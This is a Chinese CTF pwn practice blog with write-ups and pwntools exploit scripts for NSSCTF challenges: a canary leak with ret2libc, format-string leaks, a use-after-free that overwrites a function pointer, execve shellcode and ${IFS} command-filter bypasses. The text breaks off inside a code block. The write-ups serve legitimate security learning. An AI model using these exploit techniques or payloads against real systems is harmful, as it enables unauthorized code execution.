    <content type="html"><![CDATA[<ul><li>现在开始还是专心打pwn，等进度赶过来的时候再打打其他方向。</li><li>已经认清自己了，以目前半吊子的知识储备无法分心学其他方向QAQ，而且打比赛其他方向也有队友了，所以其他方向不急着学。</li></ul><h1 id="nssctf"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h1><h2 id="题目1_littleof"><a href="#题目1-littleof" class="headerlink" title="题目1_littleof"></a>题目1_littleof</h2><ul><li><p>考点：<code>ret2libc</code>、<code>Canary绕过</code></p></li><li><p>先查看一下保护机制，发现开了Canary</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241129235605399.png" alt="image-20241129235605399"></p><ul><li>然后再反编译查看一下程序运行的逻辑。运行逻辑主要就是在下图的函数中。</li><li>这边还有俩个溢出点，但是由于有Canary，所以第一个溢出点是泄露Canary的值，然后第二个才是真正的进行溢出构造ROP链</li><li>这边还需要注意一下接收，因为<code>%s</code>除了格式化输出Canary的值，还输出了rbp栈地址的值</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241129235724940.png" alt="image-20241129235724940"></p><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241129235747714.png" alt="image-20241129235747714"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28938</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./littleof&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.send(b&#x27;a&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x49</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#p.send(b&#x27;a&#x27;)</span></span><br><span class="line">canary = p.recv()</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span> + canary[<span class="number">0x49</span>:<span class="number">0x50</span>]</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">canary = <span class="built_in">int</span>.from_bytes(canary,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">pop_rdi = <span class="number">0x400863</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">puts_plt = <span class="number">0x4005B0</span></span><br><span class="line">ret = <span class="number">0x40059e</span></span><br><span class="line">fun = <span class="number">0x4006E2</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi)</span><br><span class="line">payload1 += p64(puts_got) + p64(puts_plt) + p64(fun)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------&gt;&#x27;</span>,puts_addr)</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(puts_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">libc_addr = puts_addr - <span class="number">0x80aa0</span></span><br><span class="line">sh_addr = libc_addr + <span class="number">0x1b3e1a</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x4f550</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload2 += p64(pop_rdi) + p64(sh_addr) + p64(ret) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目2_find_flag"><a href="#题目2-find-flag" class="headerlink" title="题目2_find_flag"></a>题目2_find_flag</h2><ul><li><p>考点：<code>格式化字符串漏洞</code></p></li><li><p>简单的字符串格式化的题目</p></li><li>先查看一下保护机制，发现全部保护都开起来了</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130003326676.png" alt="image-20241130003326676"></p><ul><li>再查看一下反编译后的程序代码，查看程序运行的逻辑，主要问题出现在这里，思路就是先泄露栈上的Canary值和ret的地址，然后计算程序的地址，然后再进行栈溢出。</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130003409125.png" alt="image-20241130003409125"></p><ul><li>这里发现了后门函数</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130003600388.png" alt="image-20241130003600388"></p><ul><li>由于本地和靶机的字符串格式化偏移不一样，直接打远程，不要动态调试。</li><li>exp如下：</li><li>先通过爆破发现，<code>%17$p</code>是泄露Canary的值和<code>%19$p</code>泄露程序返回地址的值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28422</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&#x27;$p&#x27;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Hi! What\&#x27;s your name?&#x27;</span>,payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure><ul><li>之后再写exp打：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28467</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%17$p&#x27;</span> + <span class="string">b&#x27;-----&#x27;</span> + <span class="string">b&#x27;%19$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Hi! What\&#x27;s your name?&#x27;</span>,payload)</span><br><span class="line">leak = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line">canary = leak[<span class="number">19</span>:<span class="number">37</span>]</span><br><span class="line">addr = leak[<span class="number">42</span>:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary----&gt;&#x27;</span>,canary)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr-----&gt;&#x27;</span>,addr)</span><br><span class="line">canary = <span class="built_in">int</span>(canary.decode(<span class="string">&#x27;utf-8&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(addr.decode(<span class="string">&#x27;utf-8&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">addr = addr - <span class="number">0x146F</span></span><br><span class="line">catflag = addr + <span class="number">0x1231</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary:&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(catflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目3_singout"><a href="#题目3-singout" class="headerlink" title="题目3_singout"></a>题目3_singout</h2><ul><li><p>考点：<code>RCE</code>、<code>Linux</code>命令绕过</p></li><li><p>这题没给附件，主要考虑的就是命令绕过（感觉主要靠的是web），没啥命令绕过的经验</p></li><li>直接看wp，wp说可以使用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nl</span><span class="variable">$&#123;IFS&#125;</span>f*</span><br><span class="line"><span class="built_in">nl</span>$IFS<span class="variable">$9f</span>*</span><br><span class="line"><span class="built_in">tail</span> ./*</span><br><span class="line"><span class="built_in">tail</span>$IFS<span class="variable">$9</span>./f*</span><br></pre></td></tr></table></figure><ul><li>这边理解一下命令的意思：</li></ul><blockquote><p>nl是Linux系统的命令，用于给每个文件编号</p><p>${IFS}中，IFS是shell特殊环境变量，代表<strong>内部字段分隔符</strong>这里表示空格。这边使用${IFS}的作用就是充当空格，因为空格可能也被禁用了</p><p>f*表示的是当前目录下所有以f开头的文件</p><p>执行该命令的就相当于执行<code>nl f*</code></p><p>​    <code>nl</code> 命令会逐行读取文件的内容，并为每一行添加行号。</p></blockquote><ul><li>这里我在本地实验一下：<ul><li>它会读取文件里面的内容。</li><li>逐行标上行号之后就会逐行输出。</li></ul></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130142130803.png" alt="image-20241130142130803"></p><h2 id="题目4_shellcode"><a href="#题目4-shellcode？" class="headerlink" title="题目4_shellcode？"></a>题目4_shellcode？</h2><ul><li>先查看保护机制发现只有Canary没开，其他都开了</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130142520377.png" alt="image-20241130142520377"></p><ul><li>查看反编译的代码，这边应该就是简单的写一个shellcode</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130142549923.png" alt="image-20241130142549923"></p><ul><li>直接开写，虽然python有自动生成工具，但是因为是练习，所以尝试自己多写一点简单shellcode，之后要碰到要自己写的就不会太牢</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">23069</span>)</span><br><span class="line">a = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax,59</span></span><br><span class="line"><span class="string">    mov rbx,0x0068732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line">p.sendline(a)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目5_hubuctf-2022-新生赛fmt"><a href="#题目5-HUBUCTF-2022-新生赛-fmt" class="headerlink" title="题目5_[HUBUCTF 2022 新生赛]fmt"></a>题目5_[HUBUCTF 2022 新生赛]fmt</h2><ul><li><p>考点：<code>格式化字符串漏洞</code></p></li><li><p>这题还以为是劫持got表，结果是就是格式化字符串的简单运用</p></li><li>直接查看附件，发现格式化字符串直接泄露栈上的值就行。</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130144139944.png" alt="image-20241130144139944"></p><ul><li>直接爆破flag所在的栈：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">29340</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;$p&#x27;</span>)</span><br><span class="line">    a = p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><ul><li>爆破出来后直接脚本一把梭：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x657b46544353534e</span>,<span class="number">0x2d35633332386366</span>,<span class="number">0x3837342d33653834</span>,<span class="number">0x392d303432612d66</span>,<span class="number">0x3331326130306634</span>,<span class="number">0xa7d393636</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(a[i]))</span><br><span class="line"></span><br><span class="line">b = [<span class="string">&#x27;e&#123;FTCSSN&#x27;</span>,<span class="string">&#x27;-5c328cf&#x27;</span>,<span class="string">&#x27;874-3e84&#x27;</span>,<span class="string">&#x27;9-042a-f&#x27;</span>,<span class="string">&#x27;312a00f4&#x27;</span>,<span class="string">&#x27;\n&#125;966&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    <span class="built_in">print</span>(b[i][-<span class="number">1</span>::-<span class="number">1</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="题目6_nisactf-2022uaf"><a href="#题目6-NISACTF-2022-UAF" class="headerlink" title="题目6_[NISACTF 2022]UAF"></a>题目6_[NISACTF 2022]UAF</h2><ul><li><p>考点：<code>UAF</code>、<code>fastbin_UAF</code></p></li><li><p>今天来打一题堆题，题目已经表明了是<code>UAF</code>漏洞，所以直接来分析程序。先来<code>check</code>一下程序。发现是<code>32位</code>的程序，没有开<code>PIE</code>随机地址偏移。</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115103509325.png" alt="image-20250115103509325"></p><ul><li>然后使用IDA分析该程序，发现是一个经典的堆菜单题目，然后使用<code>scanf</code>函数输入我们要选择的菜单选项。</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115103618336.png" alt="image-20250115103618336"></p><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115103653093.png" alt="image-20250115103653093"></p><ul><li>接下来先查看<code>create()</code>函数，在这边有两个在<code>.bss</code>段上的全局变量<code>i</code>和<code>page</code><ul><li>该程序先输入我们申请<code>page</code>的索引，然后对这个索引进行检查，当<code>i</code>在0到9之间就会先创建一个堆块，并将堆块的地址存储在<code>page</code>这个<code>指针数组</code>这边</li><li>然后对<code>i</code>进行检查如果<code>i</code>大于9就没有<code>PAGE</code>分配给新申请的堆块，如果还有空间<code>i</code>就会自增1</li><li>当<code>i=0</code>的时候会先初始化<code>page</code>即在该堆块里面前4字节存储着一串数字，后4字节存储着函数指针，用于输出功能。</li></ul></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115104133066.png" alt="image-20250115104133066"></p><ul><li>通过查看<code>.bss</code>段我们可以确定<code>i</code>是一个int类型的变量占<code>4</code>字节，而<code>page</code>很明显是一个指针数组，该数组定义了<code>10</code>个指针变量</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115105250344.png" alt="image-20250115105250344"></p><ul><li>接下来我们再来查看，<code>edit()</code>这部分函数执行什么<ul><li>首先是输入我们要修改的堆块索引</li><li>然后使用<code>scanf</code>向该堆块输入内容，但是这里好像存在溢出</li></ul></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115105436837.png" alt="image-20250115105436837"></p><ul><li>之后再来查看<code>del()</code>这个函数的功能，该函数的功能就是<code>free</code>我们指定的堆块，但是这边存在一个<code>UAF</code>的漏洞，所以我们可能可以利用这个漏洞。</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115105558291.png" alt="image-20250115105558291"></p><ul><li>之后再来查看<code>show</code>这个函数的功能，是输出我们所选择的堆块，但是这里要注意一下，就是当我们要输入<code>page[0]</code>的时候，程序会调用这个函数指针，即该函数指针存放在<code>page[1]</code>这个位置，然后去输出<code>page[0]</code>的内容。</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115105648696.png" alt="image-20250115105648696"></p><ul><li>我们还发现了一个后门函数</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115110030686.png" alt="image-20250115110030686"></p><ul><li><p>所以思路如下：</p><ul><li>通过<code>UAF</code>漏洞修改函数指针为后门函数，然后再修改向<code>page[0][0]</code>中写入<code>/bin/sh\x00</code>或者<code>/sh\x00\x00</code></li><li>这样我们就劫持了程序的控制流到后门函数，就可以成功执行<code>system(&quot;/bin/sh&quot;)</code></li></ul></li><li><p>接下来使用动态调试查看堆块的具体运行情况</p></li><li>首选我们发现第一次是堆块的初始化</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115111627174.png" alt="image-20250115111627174"></p><ul><li><p>所以我要利用<code>UAF</code>漏洞，将该对<code>page[0]</code>这里面的内容进行修改从而执行程序控制流，接下来进行堆的布局。首先我们要先初始化一个<code>page</code>，为了防止堆块的合并，我们还要再申请一个堆块。之后先释放<code>page[0]</code>所指向的堆块，再创建一个新的堆块就可以把<code>page[0]</code>的堆块给申请到<code>page[2]</code>这边，这样我们就可以调用<code>edit</code>函数对这个堆块进行修改了。</p></li><li><p>exp如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28471</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">page,string</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input page\n&#x27;</span>,<span class="built_in">str</span>(page).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input your strings\n&#x27;</span>,string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">page</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input page\n&#x27;</span>,<span class="built_in">str</span>(page).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">page</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input page\n&#x27;</span>,<span class="built_in">str</span>(page).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">create()</span><br><span class="line">create()</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create()</span><br><span class="line">payload = <span class="string">b&#x27;\sh\x00&#x27;</span> + p32(<span class="number">0x8048642</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目7_hnctf-2022-week1ezcmp"><a href="#题目7-HNCTF-2022-Week1-ezcmp" class="headerlink" title="题目7_[HNCTF 2022 Week1]ezcmp"></a>题目7_[HNCTF 2022 Week1]ezcmp</h2><ul><li><p>考点：<code>gdb动态调试</code></p></li><li><p>该题比较简单，不仅给了附件，还给了源码。这边直接查看一下源码</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buff[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> v0;</span><br><span class="line"><span class="type">char</span> buffff[]=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234&quot;</span>;</span><br><span class="line"><span class="type">char</span> bua[]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz4321&quot;</span>;</span><br><span class="line"><span class="type">char</span>* <span class="title function_">enccrypt</span><span class="params">(<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">29</span>;i++)&#123;</span><br><span class="line">        a=rand();</span><br><span class="line">        buf[i]^=buffff[i];</span><br><span class="line">        buff[i]^=bua[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">29</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line">            buf[j]=buff[i];</span><br><span class="line">            buf[i]+=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        buf[i]-=((bua[i]^<span class="number">0x30</span>)*(buffff[i]&gt;&gt;<span class="number">2</span>)&amp;<span class="number">1</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">        buf[i]+=(a%buff[i])&amp;<span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;GDB-pwndbg maybe useful&quot;</span>);</span><br><span class="line">    <span class="type">char</span> buf[]=<span class="string">&quot;Ayaka_nbbbbbbbbbbbbbbbbb_pluss&quot;</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(buff,buf);</span><br><span class="line">    <span class="type">char</span> test[<span class="number">30</span>];</span><br><span class="line">    <span class="type">int</span> v0=<span class="number">1</span>;</span><br><span class="line">    srand(v0);</span><br><span class="line">    enccrypt(buff);</span><br><span class="line">    read(<span class="number">0</span>,test,<span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(buff,test,<span class="number">30</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Oh No!You lose!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>该题程序就是将<code>Ayaka_nbbbbbbbbbbbbbbbbb_pluss</code>这个字符串进行加密，让我们输入数据，然后与加密过后的数据进行比较，如果与加密后的结果一致，那么就可以<code>getshell</code>，这里先使用<code>IDA</code>逆向一下该二进制程序，找到main函数中<code>call read</code>的地址。以及找到全局变量<code>buff</code>的地址。</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250116112840731.png" alt="image-20250116112840731"></p><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250116112950344.png" alt="image-20250116112950344"></p><ul><li>然后使用<code>gdb</code>动态调试，在<code>call read</code>这个位置去设置断点，设置完断点后使用<code>c</code>命令</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250116113100715.png" alt="image-20250116113100715"></p><ul><li>这时我们再查看全局变量<code>buff</code>里面的值，这样我们就可以看到加密后的数据了</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250116113225888.png" alt="image-20250116113225888"></p><ul><li>这样我们就可以编写exp：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 